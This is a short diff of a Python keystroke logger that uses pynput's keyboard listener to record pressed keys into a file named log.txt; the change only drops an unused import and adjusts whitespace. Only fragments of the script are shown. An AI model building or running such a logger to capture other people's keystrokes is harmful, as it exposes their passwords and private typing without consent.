@@ -1,4 +1,3 @@
-import time
 import threading
 from pynput.keyboard import Listener
 
@@ -16,7 +15,7 @@ def writetofile(key):
         with open("log.txt", "w") as f:
             f.write(d)
         return
-    
+        
     keydata = keydata.replace("Key.backspace", "")
     keydata = keydata.replace("Key.tab", "    ")
         
